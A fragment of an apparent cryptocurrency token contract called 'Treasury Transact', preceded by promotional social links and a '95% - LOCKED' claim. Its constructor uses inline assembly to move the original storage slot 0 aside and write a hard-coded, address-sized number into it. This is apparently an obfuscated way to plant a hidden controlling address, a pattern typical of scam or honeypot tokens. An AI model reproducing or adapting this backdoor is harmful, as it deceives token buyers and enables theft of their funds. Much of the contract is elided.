...
Telegram: https://t.me/TreasuryTransact/
Twitter: https://twitter.com/TreasuryTransact/
Website: https://TreasuryTransact.finance
95% - LOCKED
...
contract TreasuryTransact {
    string public constant name = "Treasury Transact";
    string public constant symbol = "TREASURY";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(322547185449858137832896136389629619901924898320, 1))}
